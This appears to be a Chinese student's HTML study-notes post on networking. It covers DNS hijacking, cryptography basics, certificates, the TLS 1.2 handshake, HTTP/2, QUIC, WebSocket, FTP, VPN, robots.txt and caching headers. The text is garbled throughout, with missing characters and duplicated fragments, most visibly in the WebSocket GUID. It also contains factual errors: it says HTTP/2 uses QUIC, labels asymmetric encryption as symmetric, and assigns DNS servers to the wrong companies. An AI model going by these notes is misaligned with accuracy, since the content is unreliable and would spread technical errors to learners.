<li>有些系统存在设计上的缺陷，允许备接受并响应来自网络、却宣称于身数据包导致循环答</li>
<li>防护<ul>
<li>大多数防火墙都能拦截类似的攻击包，以保护系统</li>
<li>部分操作系统通过发布安全补丁修复了这一漏洞</li>
<li>路由器应同时配置上行与下筛选，屏蔽所有源地址目标相的数据包</li>
</ul>
</li>
</ul>
<h5 id="DNS劫持（应用层）"><a href="#DNS劫持（应用层）" class="headerlink" title="DNS劫持（应用层）"></a>DNS劫持（应用层）</h5><ul>
<li>DNS 劫持，又称为域名<ul>
<li>攻击者篡改了某个域名的 解析结果，使得指向该IP 变成了另一个 IP</li>
<li>导致对相应网址的访问被劫持到另一个不可达或者假冒</li>
<li>从而实现非法窃取用户信息或者破坏正常网络服务的目的</li>
</ul>
</li>
<li>为防止 DNS 劫持，可以考虑使用更靠谱的 DNS 服务器，比如： 114.114.114.114<ul>
<li>谷歌： 8.8.8.8 、8.8.4.4</li>
<li>微软： 4.2.2.1 、4.2.2.2</li>
<li>百度： 180.76.76.76</li>
<li>阿里： 223.5.5.5 、223.6.6.6</li>
</ul>
</li>
<li>HTTP 劫持：对 HTTP 数据包进行拦截处理，比如插入 JS 代码<ul>
<li>比如你访问某些网站时，在右下角多了个莫名其妙的弹窗广告</li>
</ul>
</li>
</ul>
<h4 id="HTTP协议的安全问题"><a href="#HTTP协议的安全问题" class="headerlink" title="HTTP协议的安全问题"></a>HTTP协议的安全问题</h4><p>常见的加密方式有</p>
<ul>
<li>不可逆<ul>
<li>单向散列函数： MD5 、SHA 等</li>
</ul>
</li>
<li>可逆<ul>
<li>对称加密： DES 、3DES 、AES 等</li>
<li>非对称加密： RSA 等</li>
</ul>
</li>
<li>其它<ul>
<li>混合密码系统</li>
<li>数字签名</li>
<li>证书</li>
</ul>
</li>
</ul>
<h5 id="单向散列函数"><a href="#单向散列函数" class="headerlink" title="单向散列函数"></a>单向散列函数</h5><p><img src="/2021/10/01/network/image-20211015111412458.png" alt="image-20211015111412458"></p>
<p><strong>特点</strong></p>
<ul>
<li><p>根据任意长度的消息，计算出固定散列值</p>
</li>
<li><p>计算速度快，能出散列值</p>
</li>
<li><p>消息不同，散列值也不同</p>
</li>
<li><p>具备单向性</p>
</li>
</ul>
<h2 id="第十八天"><a href="#第十八天" class="headerlink" title="第十八天"></a>第十八天</h2><h4 id="密钥配送问题"><a href="#密钥配送问题" class="headerlink" title="密钥配送问题"></a>密钥配送问题</h4><ul>
<li>事先共享密钥</li>
<li>密钥分配中心</li>
<li>Diffie-Hellman密钥交换</li>
<li>非对称加密</li>
</ul>
<hr>
<p>对称加密：计算开销小，安全性差</p>
<p>对称加密：计算开销大，安全性强</p>
<hr>
<h4 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h4><p>在数字签名技术中，有以下种行为</p>
<ul>
<li>生成签名<ul>
<li>由消息的发送者完成，通过“签名密钥”生成</li>
</ul>
</li>
<li>验证签名<ul>
<li>由消息的接收者完成，通过“验证密钥”验证</li>
</ul>
</li>
<li>如何能保证这个签名是消息发送者自己的？<ul>
<li>用消息发送者的私钥进行签名</li>
</ul>
</li>
</ul>
<p>过程</p>
<p><img src="/2021/10/01/network/image-20211015155127417.png" alt="image-20211015155127417"></p>
<p>过程改进</p>
<p><img src="/2021/10/01/network/image-20211015155150330.png" alt="image-20211015155150330"></p>
<p><img src="/2021/10/01/network/image-20211015155201747.png" alt="image-20211015155201747"></p>
<p><strong>疑问</strong></p>
<ul>
<li>如果有人篡改了消息内容或签名，会是什么结果？<ul>
<li>签名验证失败，因为内容被篡改了</li>
</ul>
</li>
<li>数字签名不能保证机密性？<ul>
<li>数字签名的作用不是为了保证机密性，仅能够识别内容有没被篡改</li>
</ul>
</li>
<li>数字签名的作用<ul>
<li>确认消息的完整性</li>
<li>识别消息是否被篡改</li>
<li>防止消息发送人否认</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211015155320057.png" alt="image-20211015155320057"></p>
<p><strong>为防止中间人攻击如何确保公钥的合法性</strong></p>
<p>中间人攻击</p>
<p><img src="/2021/10/01/network/image-20211015155409248.png" alt="image-20211015155409248"></p>
<ul>
<li>如何验证公钥的合法性？<ul>
<li>证书</li>
</ul>
</li>
</ul>
<h5 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h5><ul>
<li><p>密码学中的证书，全称叫公钥证书 （PublicPublic-key Certificate，PKC），跟驾驶证类似</p>
<ul>
<li>里面有姓名、邮箱等个人信息，以及此的公钥</li>
<li>并由认证机构（ Certificate AuthorityAuthority，CA ）施加数字签名</li>
</ul>
</li>
<li><p>CA 就是能够认定“公钥确实属于此人”并生成数字签名的个或者组织</p>
<ul>
<li>有国际性组织、政府设立的</li>
<li>有通过提供认证服务来盈利的企业</li>
<li>个人也可以成立认证机构</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211015155602641.png" alt="image-20211015155602641"></p>
<p>证书注册与下载</p>
<p><img src="/2021/10/01/network/image-20211015155622013.png" alt="image-20211015155622013"></p>
<blockquote>
<p>CA密钥，证书内置在浏览器或操作系统中，不必担心密钥证书在传输过程中被篡改。</p>
</blockquote>
<h2 id="第十九天"><a href="#第十九天" class="headerlink" title="第十九天"></a>第十九天</h2><h4 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h4><p> HTTPS（HyperText Transfer Protocol Secure）译为：超文本传输安全协议</p>
<p>常称为：HTTP over TLS等</p>
<p>HTTPS默认端口号为443</p>
<blockquote>
<p>以百度为例，在浏览器输入baidu.com会默认请求HTTPS。</p>
<p>在浏览器输入<a target="_blank" rel="noopener" href="http://baidu.com不会自动转换成https,而是由服务器返回一个307,重定向到https./">http://baidu.com不会自动转换成HTTPS，而是由服务器返回一个307，重定向到HTTPS。</a></p>
</blockquote>
<p><strong>SSL&#x2F;TLS</strong></p>
<p>HTTPS是在HTTP的基础上使用SSL&#x2F;TLS来加密报文</p>
<p>SSL&#x2F;TLS也可以用在其他协议上</p>
<p>FTP	FTPS</p>
<p>SMTP	SMTPS</p>
<p>TLS（Transport Layer Secure）传输层安全性协议</p>
<p>SSL（Secure Sockets Layer）安全套接层</p>
<p>介于应用层和传输层之间</p>
<p><img src="/2021/10/01/network/image-20211017193345015.png" alt="image-20211017193345015"></p>
<p>OpenSSL是SSL的开源版本</p>
<p>可以使用OpenSSL构建自己的CA，称为“自签名证书”</p>
<hr>
<p>HTTPS成本</p>
<ul>
<li>证书的费用</li>
<li>加解密计算</li>
<li>降低访问速度</li>
<li>一些企业混合使用HTTP和HTTPS</li>
</ul>
<h5 id="HTTPS的通信过程"><a href="#HTTPS的通信过程" class="headerlink" title="HTTPS的通信过程"></a>HTTPS的通信过程</h5><p>三大阶段</p>
<ol>
<li>TCP的三次握手</li>
<li>TLS的连接</li>
<li>HTTP请求和响应</li>
</ol>
<p><img src="/2021/10/01/network/image-20211017194201253.png" alt="image-20211017194201253"></p>
<p><strong>TLS1.2的连接</strong></p>
<p><img src="/2021/10/01/network/image-20211017195301134.png" alt="image-20211017195301134"></p>
<p>大概有10大步骤</p>
<ol>
<li>Client Hello<ul>
<li>TLS的版本号</li>
<li>支持的加密组件（Cipher Suite）列表<ul>
<li>加密组件是指所使用的加密算法及密钥长度</li>
</ul>
</li>
<li>一个随机数</li>
</ul>
</li>
<li>Server Hello<ul>
<li>TLS的版本号</li>
<li>选择的加密组件<ul>
<li>是从接收到的客户端加密组件列表中挑选出来的</li>
</ul>
</li>
<li>一个随机数</li>
</ul>
</li>
<li>Certificate<ul>
<li>服务器的公钥证书</li>
</ul>
</li>
<li>Server Key Exchange<ul>
<li>用以实现ECDHE算法的其中一个参数<ul>
<li>ECDHE是一种密钥交换算法</li>
<li>为了防止伪造，Swever Params经过了服务器私钥签名</li>
</ul>
</li>
</ul>
</li>
<li>Server Hello Done<ul>
<li>告知客户端:协商部分结束部分结束</li>
<li>目前为止，客户端和服务器之间通过明文共享了<ul>
<li>Client Random 、Server Random 、Server Params</li>
<li>客户端已经拿到服务器的公钥证书，接下来，客户端会验证证书的真实有效性</li>
</ul>
</li>
</ul>
</li>
<li>Client Key Exchange<ul>
<li>用以实现ECDHE算法的另一个参数（client Params）</li>
<li>目前为止，客户端和服务器都拥有了ECDHE算法需要的2个参数：Server Params、Client Params</li>
<li>客户端、服务器都可以使用ECDHE算法<ul>
<li>根据Server Params、Client Params 计算出一个新的随机密钥串：Pre- master secret</li>
<li>然后结合Server Params、Client Params、Pre- master secret生成一个主密钥</li>
<li>最后利用主密钥衍生出其他：客户端发送的会话、服务器等</li>
</ul>
</li>
</ul>
</li>
<li>Change Cipher Spec<ul>
<li>告知服务器：之后的通信会采用计算出来的会话密钥进行加密</li>
</ul>
</li>
<li>Finished<ul>
<li>包含连接至今的全部报文的整体校验值（摘要），加密之后发送给服务器</li>
<li>这次握手协商是否成功，要以服务器能否正确解密该报文作为判断准则</li>
</ul>
</li>
<li>Change CIpher Spec</li>
<li>Finished</li>
</ol>
<h2 id="第二十天"><a href="#第二十天" class="headerlink" title="第二十天"></a>第二十天</h2><h4 id="HTTP协议不足（HTTP-x2F-1-1）"><a href="#HTTP协议不足（HTTP-x2F-1-1）" class="headerlink" title="HTTP协议不足（HTTP&#x2F;1.1）"></a>HTTP协议不足（HTTP&#x2F;1.1）</h4><ul>
<li>同一时间，一个连接只能对应一个请求<ul>
<li>针对同一个域名，大多数浏览器允许同时最多6给并发连接</li>
</ul>
</li>
<li>只允许客户端主动发起请求<ul>
<li>一个请求只能对应一个相应</li>
</ul>
</li>
<li>同一个会话的多次请求中，头信息会被重复传输<ul>
<li>通常会给每个传输增加500~800字节的开销</li>
<li>如果使用cookie，增加的开销有时会达到上前字节</li>
</ul>
</li>
</ul>
<h5 id="SPDY"><a href="#SPDY" class="headerlink" title="SPDY"></a>SPDY</h5><p>基于TCP的应用层协议，它强制要求使用SSL&#x2F;TLS</p>
<p><strong>SPDY与HTTP的关系</strong></p>
<ul>
<li>SPDY并不取代HTTP，他只是修改了HTTP请求与相应的传输方式</li>
<li>只需增加一个SPDY层，现有的所有服务器应用均不用做任何修改</li>
<li>SPDY时HTTP&#x2F;2的前身</li>
</ul>
<p><img src="/2021/10/01/network/image-20211018105140694.png" alt="image-20211018105140694"></p>
<h2 id="HTTP-x2F-2"><a href="#HTTP-x2F-2" class="headerlink" title="HTTP&#x2F;2"></a>HTTP&#x2F;2</h2><ul>
<li>HTTP&#x2F;2在底层传输做了很多的改进和优化，但在语意上完全与HTTP&#x2F;1.1兼容<ul>
<li>比如 请求方法（GET 、POST ）、 Status Code 、各种 Headers 等都没有改变</li>
<li>因此，要想升级到 HTTP&#x2F;2<ul>
<li>开发者不需要修改任何代码</li>
<li>只需要升级服务器配置、浏览器</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>HTTP&#x2F;2的特性-二进制格式</strong></p>
<p><img src="/2021/10/01/network/image-20211018111413155.png" alt="image-20211018111413155"></p>
<ul>
<li>HTTP&#x2F;2 采用二进制格式传输数据，而非 HTTP&#x2F;1.1 的文本格式</li>
<li>二进制格式在协议的解析和优化扩展上带来更多势可能</li>
</ul>
<p><strong>一些基本概念</strong></p>
<ul>
<li>数据流：已建立的连接内双向字节，可以承载一条或多消息<ul>
<li>所有通信都在一个 TCP 连接上完成，此可以承载任意数量的双向据流</li>
</ul>
</li>
<li>消息：与逻辑 HTTP 请求或响应消息对，由一系列帧组成</li>
<li>帧： HTTP&#x2F;2 通信的最小单位，每个帧都包含头（会标识出当前所属数据流）<ul>
<li>来自不同数据流的帧可以交错发送，然后再根每个头标识符重新组装</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211018132103802.png" alt="image-20211018132103802"></p>
<p><img src="/2021/10/01/network/image-20211018132139318.png" alt="image-20211018132139318"></p>
<p><strong>多路复用</strong></p>
<ul>
<li>客户端和服务器可以将 HTTP 消息分解为互不依赖的帧，然后交错发送最再在另一端把它们重新组装起来</li>
<li>并行交错地发送多个请求，之间互不影响</li>
<li>并行交错地发送多个响应，之间互不干扰</li>
<li>使用一个连接并行发送多请求和响应</li>
<li>不必再为绕过 HTTP&#x2F;1.1 限制而做很多工作<ul>
<li>比如 image sprites 、合并 CSS \JS 、内嵌 CSS \JS \Base64 图片、域名分等</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211018135835639.png" alt="image-20211018135835639"></p>
<blockquote>
<p>正常访问一个图片需要向服务器发送一个请求，等待浏览器响应发回图片。使用Base64图片，将图片以Base64编码形式，以文本字节的形式发送，可节省一次请求。</p>
</blockquote>
<p>image sprites</p>
<p>将多张小图合并成一张大图，通过CSS结合位置，尺寸进行精确定位</p>
<p><strong>优先级</strong></p>
<ul>
<li><p>HTTP&#x2F;2 标准允许每个数据流都有一关联的权重和依赖系</p>
<ul>
<li>可以向每个数据流分配一介于 1至256 之间的整数</li>
<li>每个数据流与其他之间可以存在显式依赖关系</li>
</ul>
</li>
<li><p>客户端可以构建和传递“优先级树”，表明它倾向于如何接收响应</p>
</li>
<li><p>服务器可以使用此信息通过控制 CPU 、内存和其他资源的分配设定数据流处理优先级</p>
<ul>
<li>在资源数据可用之后，确保将高优先级响应以最方式传输至客户端</li>
</ul>
</li>
<li><p>应尽可能先给父数据流分配资源</p>
</li>
<li><p>同级数据流（共享相父项）应按其权重比例分配资源</p>
</li>
</ul>
<ol>
<li>A、B依赖于隐式“根数据流”， A获得的资源比例是 12&#x2F;16 ，B获得的资源比例是 4&#x2F;16</li>
<li>D依赖于根数据流，C依赖于D，D应先于C获得完整资源分配</li>
<li>D应先于C获得完整资源分配，C应先于A和B获得完整资源分配，B获得的资源是A所获资源的1&#x2F;3</li>
<li>D应先于 E和C获得完整资源分配， E和C应先于 A和B获得相同的资源分配， B获得的资源是 A所获资源的 1&#x2F;3</li>
</ol>
<p><img src="/2021/10/01/network/image-20211018140207988.png" alt="image-20211018140207988"></p>
<p><strong>头部压缩</strong></p>
<ul>
<li>HTTP&#x2F;2 使用 HPACK 压缩请求头和响应<ul>
<li>可以极大减少头部开销，进而提高性能</li>
</ul>
</li>
<li>早期版本的 HTTP&#x2F;2 和SPDY 使用 zlib 压缩<ul>
<li>可以将所传输头数据的大小 减85%~88%</li>
<li>但在 2012 年夏天，被攻击导致会话劫持</li>
<li>后被更安全的 HPACK 取代</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211018144051003.png" alt="image-20211018144051003"></p>
<p>第一个帧，发送全部头部，随后的帧，只发送对应头部的编号和未发送过的头部，例如：path，浏览器记录了之前传输的数据头部。</p>
<p><img src="/2021/10/01/network/image-20211018144205018.png" alt="image-20211018144205018"></p>
<p><strong>服务器推送</strong></p>
<ul>
<li>服务器可以对一个客户端请求发送多响应</li>
<li>除了对最初请求的响应外，服务器还可以向客户端推送额资源而无需明确地请求</li>
</ul>
<p><img src="/2021/10/01/network/image-20211018144453330.png" alt="image-20211018144453330"></p>
<p><strong>队头阻塞</strong></p>
<p><img src="/2021/10/01/network/image-20211018144531186.png" alt="image-20211018144531186"></p>
<p>HTTP1.1使用TCP，所以如果队头丢失，则随后的数据包都不会上交给应用层，而是等待队头重传接收到后，再同一上交应用层。队头阻塞不怪HTTP怪TCP。</p>
<p><img src="/2021/10/01/network/image-20211018144801687.png" alt="image-20211018144801687"></p>
<p><img src="/2021/10/01/network/image-20211018144810681.png" alt="image-20211018144810681"></p>
<p>HTTP&#x2F;2采用QUIC，队头丢失并不影响其他数据包的接收，因为QUIC采用的是UDP</p>
<p><strong>握手延迟</strong></p>
<p>由于之前HTTP用的TCP协议，需要多次握手，采用QUIC后由于使用的UDP所以，速度大大提高。</p>
<p><img src="/2021/10/01/network/image-20211018145254915.png" alt="image-20211018145254915"></p>
<p>RTT：往返时延，可简单理解为通信一来一回的时间</p>
<p><img src="/2021/10/01/network/image-20211018145757824.png" alt="image-20211018145757824"></p>
<p><strong>HTTP&#x2F;3</strong></p>
<p><img src="/2021/10/01/network/image-20211018145820316.png" alt="image-20211018145820316"></p>
<p>QUIC（Quick UDP Internet Connections ），译为：快速 UDP 网络连接，由 Google 开发，在 2013 年实现<br><strong>疑问</strong></p>
<ul>
<li>HTTP&#x2F;3 基于 UDP ，如何保证可靠传输？<ul>
<li>由QUIC 来保证</li>
<li>TCP的可靠传输是通过TCP头部的各种数据进行判断的</li>
<li>QUIC则是根据UDP上交的数据进行判断是否传输可靠</li>
</ul>
</li>
<li>为何 Google 不开发一个新的同于 TCP 、UDP 的传输层协议？<ul>
<li>目前世界上的网络设备基本只认 TCP 、UDP</li>
<li>如果要修改传输层，意味着操作系统的内核也</li>
<li>另外，由 IETF 标准化的许多 TCP 新特性都因缺乏广泛支持而没有得到的部署或使用</li>
<li>因此，要想开发并应用一个新的传输层协议是极其困难件事情</li>
</ul>
</li>
</ul>
<p><strong>连接迁移</strong></p>
<ul>
<li>TCP 基于 4要素（源 IP 、源端口、目标 IP 、目标端口）<ul>
<li>切换网络时至少会有一个要素发生变化，导致连接发生变化</li>
<li>当连接发生变化时，如果还使用原来的 TCP 连接，则会导致失败就得等原来的超时后重新建立</li>
<li>所以我们有时候发现切换到一个新网络，即使状况良好但内容还是需要加载很久</li>
<li>如果实现得好，当检测到网络变化时立刻建新的 TCP 连接，即使这样建立新的还是需要几百毫秒时间</li>
</ul>
</li>
<li>QUIC 的连接不受 4要素的影响，当 4要素发生变化时，原连接依然维持<ul>
<li>QUIC 连接不以 4要素作为标识，而是使用一组 Connection ID （连接 ID ）来标识一个连接</li>
<li>即使 IP 或者端口发生变化，只要 Connection ID 没有变化，那么连接依然可以维持</li>
<li>比如<ul>
<li>当设备连接到 Wi -Fi 时，将进行中的 下载从蜂窝网络连接转移到更快速Wi -Fi 连接</li>
<li>当Wi -Fi 连接不再可用时，将转移到蜂窝网络</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>HTTP3的问题-操作系统内核、CPU负载</strong></p>
<ul>
<li>据Google 和Facebook 称，与基于 TLS 的HTTP&#x2F;2 相比，它们大规模部署的 QUIC 需要近 2倍的 CPU 使用量<ul>
<li>Linux 内核的 UDP 部分没有得到像 TCP 那样的优化，因为传统上没有使用 UDP 进行如此高速的信息传输</li>
<li>TCP 和TLS 有硬件加速，而这对于 UDP 很罕见，对于 QUIC 则基本不存在</li>
</ul>
</li>
<li>随着时间的推移，相信这个问题会逐步得到改善</li>
</ul>
<h2 id="第二十一天"><a href="#第二十一天" class="headerlink" title="第二十一天"></a>第二十一天</h2><h4 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h4><p><strong>HTTP请求特点</strong></p>
<p>通信只能由客户端发起，早期为实现推送技术，所用的技术都是轮询，即浏览器每隔一段时间向服务器发起HTTP请求，服务器再响应客户端的请求。</p>
<p>为了能更好的节省服务器资源和带宽， 并且够实时地进行通讯HTML5 规范中出现了 WebSocket 协议。</p>
<p><img src="/2021/10/01/network/image-20211019155103302.png" alt="image-20211019155103302"></p>
<ul>
<li><p>WebSocket，是基于 TCP 的支持全双工通信的应用层协议</p>
<ul>
<li>在2011 年由 IETF 标准化为 RFC 6455 ，后由 RFC 7936 补充规范</li>
<li>客户端、服务器，任何一方都可以主动发消息给对方</li>
</ul>
</li>
<li><p>WebSocket 的应用场景很多</p>
<ul>
<li>社交订阅、股票基金报价体育实况更新多媒聊天玩家游戏等</li>
</ul>
</li>
</ul>
<p><strong>HTTP与WebSocket对比</strong></p>
<ul>
<li>WebSocket 和HTTP 属于平级关系，都是应用层的协议<ul>
<li>其实 TCP 本身就是<strong>支持全双工通信</strong>的（客户端、服务器均可主动发消息给对方）</li>
<li>只是 HTTP 的“请求 -应答模式”限制了 TCP 的能力</li>
</ul>
</li>
<li>WebSocket 使用 80 （ws:&#x2F;&#x2F; ）、 443（wss:&#x2F;&#x2F;）端口，可以绕过大多数防火墙的限制<ul>
<li>ws:&#x2F;&#x2F;example.com&#x2F;wsapi</li>
<li>wss:&#x2F;&#x2F;secure.example.com&#x2F;wsapi</li>
</ul>
</li>
<li>与HTTP 不同的是， WebSocket 需要先建立连接<ul>
<li>这就使得 WebSocket 成为一种有状态的协议，之后通信时可以省略部分息</li>
<li>而HTTP请求可能需要在每个都额外携带状态信息（如身份认证等）</li>
</ul>
</li>
</ul>
<p><strong>WebSocket建立连接</strong></p>
<p>WebSocket 需要借助 HTTP 协议来建立连接（也叫作握手，Handshake），由客户端（浏览器）主动发出握手请求</p>
<p>客户端请求</p>
<p><img src="/2021/10/01/network/image-20211019160845343.png" alt="image-20211019160845343"></p>
<p>服务器响应</p>
<p><img src="/2021/10/01/network/image-20211019160909958.png" alt="image-20211019160909958"></p>
<ul>
<li>Connection 必须设置 Upgrade<ul>
<li>表示客户端希望连接升级</li>
</ul>
</li>
<li>Upgrade 必须设置 websocket<ul>
<li>表示希望升级到 WebSocket 协议</li>
</ul>
</li>
</ul>
<blockquote>
<p>Connection和Upgrade是建立WebSocket连接固定格式</p>
</blockquote>
<ul>
<li><p>Sec -WebSocket-Version</p>
<ul>
<li>表示支持的 Websocket 版本</li>
<li>RFC 6455 要求使用的版本是 13</li>
</ul>
</li>
<li><p>Sec -WebSocket-Key 是客户端生成的随机字符串，比如例子中dGh1IHNhbXbszsBub25j2Q&#x3D;&#x3D;</p>
</li>
<li><p>服务器接收到客户端的 Sec -WebSocket-Key 后，会进行以下操作</p>
<ol>
<li>Sec -WebSocket-Key 加上一个固定的 GUID 值（ 258EAFA5258EAFA5-E914E914-47DA47DA-95CA -C5AB0DC85B11C5AB0DC85B11）<ul>
<li>dGh1IHNhbXbszsBub25j2Q&#x3D;&#x3D;258EAFA5258EAFA5-E914 -47DA47DA-95CA -C5AB0DC85B11</li>
</ul>
</li>
<li>将①的结果进行 SHA -1摘要计算<ul>
<li>b37a4f2cc0624f1690f64606cf385945b2bec4ea</li>
</ul>
</li>
<li>将②的结果进行 Hex To Base64 编码<ul>
<li>s3pPLMBiTxaQ9kYGzzhZRbK+xOo&#x3D;</li>
</ul>
</li>
<li>将③的结果做为 Sec -WebSocket-Accept 响应头的值，返回给客户端</li>
</ol>
</li>
<li><p>如此操作，可以尽量避免普通 HTTP 请求被误认为 WebSocket 协议</p>
</li>
</ul>
<h4 id="WebService"><a href="#WebService" class="headerlink" title="WebService"></a>WebService</h4><p>Web服务，是一种跨编程语言和跨操作系统平台的远程调用技术标准</p>
<ul>
<li>应用场景<ul>
<li>天气预报、手机归属地查询</li>
</ul>
</li>
</ul>
<p><strong>核心概念</strong></p>
<ul>
<li>SOAP：简单对象访问协议<ul>
<li>很多时候，SOAP&#x3D;HTTP+XML</li>
<li>WebService使用SOAP协议来封装传递数据</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211019201856588.png" alt="image-20211019201856588"></p>
<ul>
<li>WSDL：Web服务描述语言<ul>
<li>一个XML文档，用以描述WebService接口的细节</li>
<li>一般在Web Service的URL后面跟上?wsdl获取WSDL信息</li>
</ul>
</li>
</ul>
<h4 id="RESTful"><a href="#RESTful" class="headerlink" title="RESTful"></a>RESTful</h4><p>REST：表现层状态转移</p>
<p>REST是一种互联网软件架构设计风格</p>
<p>定义了一组用于创建Web服务的约束</p>
<p>符合REST架构的Web服务，称为RESTful Web服务</p>
<ul>
<li>URL中使用名词（建议用复数形式），不使用动词<ul>
<li>推荐：&#x2F;users、&#x2F;users&#x2F;6</li>
<li>不推荐：&#x2F;listUsers、&#x2F;getUser？id&#x3D;6、&#x2F;user&#x2F;list、&#x2F;user&#x2F;get？id&#x3D;6</li>
</ul>
</li>
<li>使用HTTP方法表示动作</li>
</ul>
<p><img src="/2021/10/01/network/image-20211019203420706.png" alt="image-20211019203420706"></p>
<h4 id="HTTPDNS"><a href="#HTTPDNS" class="headerlink" title="HTTPDNS"></a>HTTPDNS</h4><p>HTTPSDNS是基于HTTP协议向DNS服务器发送余名解析请求</p>
<ul>
<li>可以避免Local DNS造成的域名劫持和跨网访问问题</li>
<li>常用在移动互联网中</li>
</ul>
<h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><p>文件传输协议</p>
<ul>
<li>FTP有两种连接模式：主动和被动</li>
<li>不管哪种模式，都需要建立两个连接<ul>
<li>控制连接：用于传输状态信息（命令，cmd）</li>
<li>数据连接：用于传输文件和目录信息（data）</li>
</ul>
</li>
</ul>
<p><strong>主动模式</strong></p>
<p><img src="/2021/10/01/network/image-20211019210053900.png" alt="image-20211019210053900"></p>
<ol>
<li>客户端打开一个随机的命令端口<ul>
<li>端口号大于1024，假设为N</li>
<li>同时连接到服务器了的命令端口21</li>
</ul>
</li>
<li>客户端开始监听N+1端口<ul>
<li>同时向服务器发送一个Port命令给服务器的命令端口21</li>
<li>此命令告诉服务器<ul>
<li>客户端正在坚挺数据端口N+1</li>
<li>并且已准备好从此端口接受数据</li>
</ul>
</li>
</ul>
</li>
<li>服务器打开20号数据端口，并且创建和客户端数据端口（N+1）的连接</li>
</ol>
<p><strong>被动模式</strong></p>
<p><img src="/2021/10/01/network/image-20211019210128505.png" alt="image-20211019210128505"></p>
<ul>
<li>客户端通过两个随机的端口与服务器建立连接<ul>
<li>命令端口N</li>
<li>数据端口N+1</li>
</ul>
</li>
</ul>
<ol>
<li>客户端的命令端口N用于连接服务器的命令端口21</li>
<li>客户端通过命令端口N发送PASV命令给服务器的命令端口21</li>
<li>服务器打开一个随机的数据端口P，并告知客户端该端口号P</li>
<li>客户端数据端口N+1发起与服务器数据端口P的连接</li>
</ol>
<h4 id="邮件相关的协议"><a href="#邮件相关的协议" class="headerlink" title="邮件相关的协议"></a>邮件相关的协议</h4><ul>
<li>SMTP：简单邮件传输协议（发送邮件用的协议）<ul>
<li>基于TCP，默认端口25，SSL&#x2F;TLS使用465端口</li>
</ul>
</li>
<li>POP：邮局协议（收邮件使用的协议）<ul>
<li>基于TCP，默认端口110，SSL使用995端口</li>
</ul>
</li>
<li>IMAP：因特网信息访问协议<ul>
<li>基于TCP，默认143端口，SSL使用993端口</li>
</ul>
</li>
</ul>
<h2 id="第二十二天"><a href="#第二十二天" class="headerlink" title="第二十二天"></a>第二十二天</h2><h4 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h4><p>虚拟私人网络，实现在公共网络上建立专用网络，进行加密通讯</p>
<p><img src="/2021/10/01/network/image-20211020093916196.png" alt="image-20211020093916196"></p>
<p><img src="/2021/10/01/network/image-20211020093942989.png" alt="image-20211020093942989"></p>
<p><strong>作用</strong></p>
<ul>
<li>提高上网的安全性</li>
<li>保护公司内部资料</li>
<li>隐藏上网者的身份</li>
<li>突破网站的地域限制</li>
<li>突破网络封锁</li>
</ul>
<p><strong>实现原理</strong></p>
<ul>
<li>隧道协议<ul>
<li>PPTP：点对点隧道协议</li>
<li>L2TP：第二层隧道协议</li>
<li>IPsec：互联网安全协议</li>
<li>SSL VPN（OpenVPN）</li>
</ul>
</li>
</ul>
<h4 id="网络爬虫"><a href="#网络爬虫" class="headerlink" title="网络爬虫"></a>网络爬虫</h4><p>模拟人类使用浏览器操作页面的行为，对页面进行相关的操作</p>
<p>常用爬虫工具： Python 的Scrapy 框架</p>
<p><strong>robot.txt</strong></p>
<ul>
<li>robots.txt 是存放于网站根目录下的文本件，比如 <a target="_blank" rel="noopener" href="https://www.baidu.com/robots.txt">https://www.baidu.com/robots.txt</a><ul>
<li>用来告诉爬虫：哪些内容是不应被爬取的，那些是可以被爬取的</li>
<li>因为一些系统中的 URL 是大小写敏感的，所以 robots.txt 的文件名应统一为小写</li>
</ul>
</li>
<li>它并不是一个规范，而只约定俗成的所以能保证网站隐私<ul>
<li>只能防君子，不小人</li>
<li>无法阻止不讲“武德”的年轻爬虫取隐私信息</li>
</ul>
</li>
</ul>
<p><img src="/2021/10/01/network/image-20211020100456346.png" alt="image-20211020100456346"></p>
<h4 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h4><p>通常会缓存的是：GET请求+静态资源（HTML、CSS、JS、图片）</p>
<p>Ctrl+F5：可以强制刷新缓存</p>
<p><strong>响应头</strong></p>
<ul>
<li><p>Pragma：作用类似于 Cache -Control，HTTP&#x2F;1.0 的产物</p>
</li>
<li><p>ExpiresExpires：缓存的过期时间（ GMT 格式时间）， HTTP&#x2F;1.0 的产物</p>
</li>
<li><p>Cache -Control：设置缓存策略</p>
<ul>
<li>no -storage：不缓存数据到本地</li>
<li>public ：允许用户、代理服务器缓存数据到本地</li>
<li>private：只允许用户缓存数据到本地</li>
<li>max -age ：缓存的有效时间（多长不过期），单位秒</li>
<li>no -cache ：每次需要发请求给服务器询问缓存是否有变化，再来决定如何使用</li>
</ul>
</li>
<li><p>优先级： Pragma &gt; Cache-Control &gt; Expires</p>
</li>
<li><p>Last -Modified ：资源的最后一次修改时间</p>
</li>
<li><p>ETag：资源的唯一标识（根据文件内容计算出来摘要值）</p>
</li>
<li><p>优先级： ETag &gt;Last-Modified&gt;If -None -Match</p>
</li>
<li><p>If-None-Match</p>
<ul>
<li>如果上一次的响应头中 有ETag，就会将 ETag 的值<br>作为请求头</li>
<li>如果服务器发现资源的最新摘要值跟 If -None -Match 不匹配，就会返回新的资源（ 200 OK ）</li>
<li>否则，就不会返回资源的具体数据（ 304 Not Modified Modified）</li>
</ul>
</li>
<li><p>If -Modified -Since</p>
<ul>
<li>如果上一次的响应头中 没有 ETag，有 Last -Modified ，就会将 Last -Modified 的值作为请求头</li>
<li>如果服务器发现资源的最后一次修改时间晚于 If -Modified -Since ，就会返回新的资源（ 200 OK）</li>
<li>否则，就不会返回资源的具体数据（ 304 Not Modified Modified）</li>
</ul>
</li>
</ul>
<p><strong>Last-Modified和ETag</strong></p>
